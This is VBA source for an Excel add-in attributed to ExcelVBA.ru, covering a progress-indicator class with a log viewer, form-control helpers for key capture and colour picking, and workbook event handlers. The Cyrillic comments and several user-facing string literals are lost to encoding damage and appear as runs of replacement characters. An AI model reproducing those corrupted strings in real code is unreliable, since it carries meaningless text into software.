    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    If Len(Caption) > 0 Then FP.Tag = Caption
    txt = Trim(FP.Tag): If ShowPercents Then txt = Fix(Percent) & " %   " & txt
    dt = Format(Now - FPStartTime, "HH:NN:SS")
    If ShowTime Then txt = "( " & dt & " )    " & txt
    FP.Caption = txt
End Sub

Private Function TimeToFinish() As String
    If Percent < 15 Then Exit Function    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|...
    dt = (Now - FPStartTime) * (100 - Percent) / Percent
    TimeToFinish = IIf(Minute(dt) > 0, Minute(dt) & " |fffd||fffd||fffd|. ", "") & Second(dt) & " |fffd||fffd||fffd|."
    If dt < TimeSerial(0, 0, 1) Then TimeToFinish = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    TimeToFinish = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & TimeToFinish
End Function

Sub SetFocus()    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    FP.Show 0: If Position <> 0 Then Move Position
End Sub

Private Sub UpdateLabels(Optional ByVal L1_txt$, Optional ByVal L2_txt$, Optional ByVal L3_txt$)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
    If L1_txt$ <> "" Then FP.L1.Caption = ProcessLabel(L1_txt$)
    If L2_txt$ <> "" Or L1_txt$ <> "" Then FP.L2.Caption = ProcessLabel(L2_txt$)
    If L3_txt$ <> "" Or L2_txt$ <> "" Or L1_txt$ <> "" Then FP.L3.Caption = ProcessLabel(L3_txt$)
End Sub

Private Function ProcessLabel(ByVal txt As String) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| txt |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    txt = Replace(txt, "$index", SubActionIndex)
    txt = Replace(txt, "$count", SubActionsCount)
    txt = Replace(txt, "$time", TimeToFinish)
    ProcessLabel = txt
End Function

Sub SubAction(Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = "", Optional ByVal L3_txt$ = "")
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If SubActionsCount = 0 Then SubActionsCount = 1
    SubActionIndex = SubActionIndex + 1
    If SubActionIndex > SubActionsCount Then SubActionIndex = SubActionsCount
    Percent = PrS + (PrE - PrS) * ((SubActionIndex - 1) / SubActionsCount)
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    Set_ProgressBar Percent: DoEvents
End Sub

Sub StartNewAction(Optional ByVal Pr_Start As Integer = 0, Optional ByVal Pr_End As Integer = 100, _
                   Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = " ", Optional ByVal L3_txt$ = " ", _
                   Optional ByVal Actions_Count As Long = 0)
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| Pr_Start % |fffd||fffd| Pr_End %
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Actions_Count |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    PrS = Pr_Start: PrE = Pr_End: SubActionIndex = 0: SubActionsCount = Actions_Count
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    Set_ProgressBar PrS
End Sub

Sub UpdateFromChild(ByVal ChildPercent As Double)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If SubActionsCount = 0 Then
        Percent = PrS + (PrE - PrS) * (ChildPercent / 100)
    Else
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, SubActionIndex = 3: SubActionsCount=10: PrS = 50: PrE = 100: ChildPercent=40
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|.|fffd|. |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 60 |fffd||fffd| 65, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 62
        Percent = PrS + (PrE - PrS) / SubActionsCount * (SubActionIndex - 1) + _
                  (PrE - PrS) / SubActionsCount * (ChildPercent / 100)
    End If
    Set_ProgressBar Percent
End Sub

Private Sub Set_ProgressBar(ByVal NewPercent As Double)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Percent = NewPercent
    If NewPercent > 100 Then Percent = 100
    If NewPercent < 0 Then Percent = 0
    FP.PrBar.Width = Int(Percent * ProgressBar_Default_Width / 100)
    SetProgressFormCaption
    FP.Repaint
    If Not Parent Is Nothing Then Parent.UpdateFromChild Percent
End Sub

'Private Function GetCurrentProgress() As Long    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    If FP.PrBar.Width = 0 Then Exit Function
'    GetCurrentProgress = FP.PrBar.Width / ProgressBar_Default_Width * 100
'End Function

Private Sub Class_Terminate()    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Unload FP: FPVisible = False
End Sub

Private Function ProgressBar_Default_Width() As Double    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    ProgressBar_Default_Width = FP.Width - 18
End Function

Function CancelButton() As MSForms.CommandButton
    Set CancelButton = FP.CommandButton_stop
End Function

' ============================== |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 23.02.2012 =========================================
Sub SetLogSize(ByVal n As Long)
    On Error Resume Next
    If n < 0 Then n = 0
    If n > 5 Then n = 5
    FP.SpinButton_log.Value = n
    FP.SpinButton_log.Visible = n > 0
End Sub

Sub Log(ByVal txt$)
    On Error Resume Next
    If ShowTimeInLog Then currtime$ = Time & vbTab
    LogString = LogString & vbNewLine & currtime$ & txt
    FP.TextBox_Log.Text = Mid(LogString, 3)
    If FP.SpinButton_log.Value = 0 Then FP.SpinButton_log.Value = 2: FP.SpinButton_log.Visible = True
    FP.CommandButton_stop.SetFocus: FP.TextBox_Log.SetFocus
End Sub

Sub ClearLog()
    LogString = "": FP.TextBox_Log.Text = ""
End Sub

Sub ShowLog()
    On Error Resume Next: Err.Clear
    filename$ = Environ("TEMP") & "\macro_log.txt"    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    With CreateObject("scripting.filesystemobject").CreateTextFile(filename, True)
        .Write Mid(LogString, 3): .Close    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|
    End With
    CreateObject("wscript.shell").Run """" & filename$ & """"    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
End Sub

Sub ShowText(ByVal txt As String, Optional ByVal index As Long)
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| txt |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    ' (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| text####.txt,
    ' |fffd||fffd||fffd| #### - |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| index, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 10-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)

    On Error Resume Next: Err.Clear
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    filename$ = Environ("TEMP") & "\text" & IIf(index, index, Left(Rnd() * 1E+15, 10)) & ".txt"
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|
    With CreateObject("scripting.filesystemobject").CreateTextFile(filename, True)
        .Write txt: .Close
    End With
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    CreateObject("wscript.shell").Run """" & filename$ & """"
End Sub

' ============================== |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 07.10.2012 =========================================

Sub AddButton(ByVal Caption$, ByVal Macro$)    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    dd = 18
    If FP.SpinButton_log = 0 Then FP.SpinButton_log = 1
    With Me.FP.CommandButton_RunMacro
        .Caption = Caption$
        .Visible = True
        .Top = FP.Height - .Height - dd - 20
        .Left = FP.Width - .Width - dd - 15
    End With
    FP.ButtonMacro = Macro$
End Sub

Function MacroButton() As MSForms.CommandButton
    Set MacroButton = FP.CommandButton_RunMacro
End Function

Sub QueryClose()    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim pi As ProgressIndicator
    For Each pi In Children
        pi.QueryClose
        pi.Hide
    Next pi
End Sub
Attribute VB_Name = "SpecialControl"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : SpecialControl
' Author        : |fffd||fffd||fffd||fffd||fffd|                     Date: 24.10.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit
Option Compare Text

Public WithEvents Scroller As MSForms.ScrollBar
Attribute Scroller.VB_VarHelpID = -1
Public WithEvents ScrolledCombo As MSForms.ComboBox
Attribute ScrolledCombo.VB_VarHelpID = -1
Dim ScrollEventEnabled As Boolean

'Public WithEvents FontSelectCombo As MSForms.ComboBox
Public WithEvents MainCheckboxInFrame As MSForms.CheckBox
Attribute MainCheckboxInFrame.VB_VarHelpID = -1
Public WithEvents ColorSelectCombo As MSForms.ComboBox
Attribute ColorSelectCombo.VB_VarHelpID = -1
Public WithEvents KeyNameTexbox As MSForms.TextBox
Attribute KeyNameTexbox.VB_VarHelpID = -1
Public WithEvents NumericTexbox As MSForms.TextBox
Attribute NumericTexbox.VB_VarHelpID = -1
Public WithEvents OptionButtonInFrame As MSForms.OptionButton
Attribute OptionButtonInFrame.VB_VarHelpID = -1


Private Sub Class_Terminate()
    ' Just for the case
    Set Scroller = Nothing
    Set ScrolledCombo = Nothing
    Set MainCheckboxInFrame = Nothing
    Set ColorSelectCombo = Nothing
    Set KeyNameTexbox = Nothing
    Set NumericTexbox = Nothing
    Set OptionButtonInFrame = Nothing
End Sub

Private Sub NumericTexbox_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    On Error Resume Next
    Select Case KeyAscii
        Case 48 To 57, 8
        Case Else: KeyAscii = 0
    End Select
End Sub


' -----------------------------------------------------------------------------------

'Private Sub FontSelectCombo_Change()
'    On Error Resume Next: Me.FontSelectCombo.SelStart = 1
'    With New FontParameters
'        .LoadFromText (Me.FontSelectCombo)
'        .ApplyToSettingsField Me.FontSelectCombo
'    End With
'    Me.FontSelectCombo.SelStart = 1
'End Sub
'
'Private Sub FontSelectCombo_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
'    On Error Resume Next: Me.FontSelectCombo.SelStart = 1
'    With New FontParameters
'        .LoadFromText (Me.FontSelectCombo): .PickNewFont
'        Me.FontSelectCombo = .ExportToText
'
'        Dim UF As Object: Set UF = Me.FontSelectCombo
'        While TypeName(UF) <> "UserForm": Set UF = UF.Parent: Wend
'        UF.Show        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    End With
'    Me.FontSelectCombo.SelStart = 1
'End Sub

' -----------------------------------------------------------------------------------
Private Sub KeyNameTexbox_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    KeyAscii = 0
End Sub
Private Sub KeyNameTexbox_KeyUp(ByVal KeyCode As MSForms.ReturnInteger, ByVal Shift As Integer)
    On Error Resume Next: Dim Button$: Button$ = GetKeyName(KeyCode, Shift)
    If Len(Button$) Then KeyCode = 0: Me.KeyNameTexbox = Button$
End Sub
' -----------------------------------------------------------------------------------
Private Sub ColorSelectCombo_Change()
    On Error Resume Next: Dim clr&: clr& = Val(Me.ColorSelectCombo): If clr& = 0 Then clr& = vbButtonFace
    Me.ColorSelectCombo.ForeColor = clr&: Me.ColorSelectCombo.BackColor = clr&
End Sub
Private Sub ColorSelectCombo_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal Y As Single)
    On Error Resume Next: Dim clr&: clr& = PickNewColor(Val(Me.ColorSelectCombo))
    Me.ColorSelectCombo = clr&
End Sub

' -----------------------------------------------------------------------------------
Private Sub MainCheckboxInFrame_Change()
    On Error Resume Next: Err.Clear
    Dim fr As MSForms.Frame, ctrl As MSForms.Control: Set fr = Me.MainCheckboxInFrame.Parent
    If Err <> 0 Or (fr Is Nothing) Then MsgBox "MainCheckboxInFrame.Parent is not frame control": Exit Sub
    For Each ctrl In fr.Controls
        If ctrl.Name <> Me.MainCheckboxInFrame.Name And Not (TypeOf ctrl Is MSForms.Label And (ctrl.ForeColor = 16384)) Then
            ctrl.Enabled = Me.MainCheckboxInFrame.Value
        End If
    Next
End Sub
' -----------------------------------------------------------------------------------
Function FieldFound() As Boolean
    On Error Resume Next
    If Not ScrolledCombo Is Nothing Then FieldFound = True: Exit Function
    ScrollEventEnabled = False: Me.Scroller.Value = 1: ScrollEventEnabled = True
    Dim ctrl As MSForms.Control
    For Each ctrl In Me.Scroller.Parent.Controls
        If TypeName(ctrl) = "ComboBox" Then
            If ctrl.Top < Scroller.Top And ctrl.Left < Scroller.Left And _
               ctrl.Top + ctrl.Height > Scroller.Top + Scroller.Height And ctrl.Left + ctrl.Width > Scroller.Left + Scroller.Width Then
                Set ScrolledCombo = ctrl
                FieldFound = True: Exit Function
            End If
        End If
    Next
    MsgBox "Combo not found", , Me.Scroller.Name
End Function


Private Sub OptionButtonInFrame_Click()
    On Error Resume Next: Err.Clear
    Dim fr As MSForms.Frame, ctrl As MSForms.Control: Set fr = Me.OptionButtonInFrame.Parent
    If (Err <> 0) Or (fr Is Nothing) Then MsgBox "OptionButtonInFrame.Parent is not frame control": Exit Sub

    Me.OptionButtonInFrame.Font.Bold = True
    For Each ctrl In fr.Controls
        If ctrl.Name <> Me.OptionButtonInFrame.Name Then
            If TypeOf ctrl Is MSForms.OptionButton Then
                ctrl.Font.Bold = False
            Else
                ctrl.Enabled = ctrl.Tag = Me.OptionButtonInFrame.Name
                If ctrl.Tag = "ScrollCombo" Then ctrl.Enabled = ctrl.Name Like "*" & Me.OptionButtonInFrame.Name
            End If
        End If
    Next
End Sub

Private Sub Scroller_Change()
    On Error Resume Next: If Not Me.FieldFound Then Exit Sub
    If Not ScrollEventEnabled Then Exit Sub
    Select Case Me.Scroller.Value
        Case 0: Me.ScrolledCombo.ListIndex = Me.ScrolledCombo.ListIndex + 1
        Case 2: If Me.ScrolledCombo.ListIndex > 0 Then Me.ScrolledCombo.ListIndex = Me.ScrolledCombo.ListIndex - 1
    End Select
    ScrollEventEnabled = False: Me.Scroller.Value = 1: ScrollEventEnabled = True
End Sub

' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Function GetKeyName(ByVal KeyCode As Integer, ByVal Shift As Integer) As String
    Dim Button$
    Select Case KeyCode
        Case 112 To 135: Button$ = "F" & (KeyCode - 111)
        Case 32: Button$ = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 8: Button$ = "BackSpace"
        Case 9: Button$ = "Tab"
        Case 13: Button$ = "Enter"
        Case 16: Button$ = ""        '"Shift"
        Case 17: Button$ = ""        '"Ctrl"
        Case 18: Button$ = ""        '"Alt"
        Case 20: Button$ = "CapsLock"
        Case 27: Button$ = "Esc"
        Case 33: Button$ = "PageUp"
        Case 34: Button$ = "PageDown"
        Case 35: Button$ = "End"
        Case 36: Button$ = "Home"
        Case 37: Button$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        Case 38: Button$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        Case 39: Button$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 40: Button$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
        Case 44: Button$ = "PrintScreen"
        Case 45: Button$ = "Insert"
        Case 46: Button$ = "Delete"
        Case vbKeyNumlock: Button$ = "Numlock"
        Case 145: Button$ = "ScrollLock"

        Case 91: Button$ = "Win(|fffd|)"
        Case 92: Button$ = "Win(|fffd||fffd|)"
        Case 96 To 105: Button$ = "|fffd||fffd||fffd|(" & KeyCode - 96 & ")"
        Case vbKeyMultiply: Button$ = "|fffd||fffd||fffd|(*)"
        Case vbKeyAdd: Button$ = "|fffd||fffd||fffd|(+)"
        Case vbKeySubtract: Button$ = "|fffd||fffd||fffd|(-)"
        Case vbKeyDecimal: Button$ = "|fffd||fffd||fffd|(,)"
        Case vbKeyDivide: Button$ = "|fffd||fffd||fffd|(/)"

        Case 166: Button$ = "Browser Back"
        Case 167: Button$ = "Browser Forward"
        Case 168: Button$ = "Browser Refresh"
        Case 169: Button$ = "Browser Stop"
        Case 170: Button$ = "Browser Search"
        Case 171: Button$ = "Browser Favorites"
        Case 172: Button$ = "Browser Home"
        Case 173: Button$ = "Volume Mute"
        Case 174: Button$ = "Volume Down"
        Case 175: Button$ = "Volume Up"
        Case 176: Button$ = "Next Track"
        Case 177: Button$ = "Previous Track"
        Case 178: Button$ = "Stop Media"
        Case 179: Button$ = "Play/Pause"
        Case 180: Button$ = "Start Mail"
        Case 181: Button$ = "Select Media"
        Case 182: Button$ = "Start App 1"
        Case 183: Button$ = "Start App 2"

        Case 48 To 57, 65 To 90: Button$ = Chr(KeyCode)
        Case Else: Button$ = "{|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & KeyCode & "}"
    End Select

    If Len(Button$) Then
        If (Shift And 1) Then GetKeyName = GetKeyName & "Shift + "
        If (Shift And 2) Then GetKeyName = GetKeyName & "Ctrl + "
        If (Shift And 4) Then GetKeyName = GetKeyName & "Alt + "
    End If
    GetKeyName = GetKeyName & Button$
End Function

Function PickNewColor(Optional ByVal i_OldColor As Double = xlNone) As Double
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next:
    PickNewColor = i_OldColor
    Const BGColor As Long = 13160660, ColorIndexLast As Long = 32
    Dim myOrgColor As Double, myNewColor As Double, WB As Workbook
    Dim myRGB_R As Integer, myRGB_G As Integer, myRGB_B As Integer, i_Color&
    If ActiveWorkbook Is Nothing Then Application.ScreenUpdating = False: Set WB = Workbooks.Add
    myOrgColor = ActiveWorkbook.Colors(ColorIndexLast)        'save original palette color

    i_Color = IIf(i_OldColor = xlNone, BGColor, i_OldColor): myRGB_R = i_Color Mod 256
    i_Color = i_Color \ 256: myRGB_G = i_Color Mod 256
    i_Color = i_Color \ 256: myRGB_B = i_Color Mod 256
    ActiveWorkbook.ResetColors        'AppActivate Application.Name
    If Application.Dialogs(xlDialogEditColor).Show(ColorIndexLast, myRGB_R, myRGB_G, myRGB_B) Then
        PickNewColor = ActiveWorkbook.Colors(ColorIndexLast)
        ThisWorkbook.Colors(ColorIndexLast) = myOrgColor
    End If
    If Not WB Is Nothing Then WB.Close False: Application.ScreenUpdating = True
End Function
Attribute VB_Name = "ThisWB"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'---------------------------------------------------------------------------------------
' VBA Document      : ThisWB
' Author        : EducatedFool                     Date: 18.01.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Public WithEvents app As Application
Attribute app.VB_VarHelpID = -1

Private Sub app_SheetBeforeDoubleClick(ByVal sh As Object, ByVal Target As Range, Cancel As Boolean)
    On Error Resume Next: Err.Clear
    If sh.Parent Is ThisWorkbook Then Exit Sub

    If Not SETT.GetBoolean("CheckBox_DisableDoubleClickOnHeader") Then
        If Target.Row = HEADER_ROW And Target.Cells.Count = 1 Then
            If Len(Trim(Target)) > 0 Then
                Cancel = True
                If Target <> Trim(Target) Then Target = Trim(Target)
                TriesCount& = 0: code$ = "{" & Trim(Target) & "}"
                Err.Clear
                Do
                    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
                        .SetText code$
                        .PutInClipboard

                        .GetFromClipboard
                        res$ = .GetText
                        TriesCount& = TriesCount& + 1
                    End With
                Loop While res$ <> code$ And TriesCount& < 10

                If Err = 0 And res$ = code$ Then
                    Shell "Cmd.exe /c echo " & Chr(7), vbHide
                Else
                    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
                        .SetText ""
                        .PutInClipboard
                    End With
                End If
            End If
        End If
    End If

    If Target.Cells.Count = 1 Then
        If HasLinkToObject(Target.Cells(1)) Then
            Cancel = True
            CtrlShiftT
        End If
    End If
End Sub

Private Sub Workbook_BeforeClose(Cancel As Boolean)
    Disable_HotKeys
End Sub

Private Sub Workbook_Open()
    Enable_HotKeys
End Sub
Attribute VB_Name = "mod_About"
'---------------------------------------------------------------------------------------
' Module        : mod_About
' Author        : |fffd||fffd||fffd||fffd||fffd|                     Date: 22.10.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module
Option Compare Text
Public Const VERSIONS_XML_FILENAME$ = "info.xml", DEMO_ACTIVATION_CODE$ = "demo", MODULE_VERSION = 16
Public cnt As Long, IAEC As Long, LIAT As Date: Public Const DEBUG_MODE As Boolean = False        'True
Public UseTempSettings As Boolean, TempSettingsCollection As New Collection

' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public Enum CONTROL_TYPES
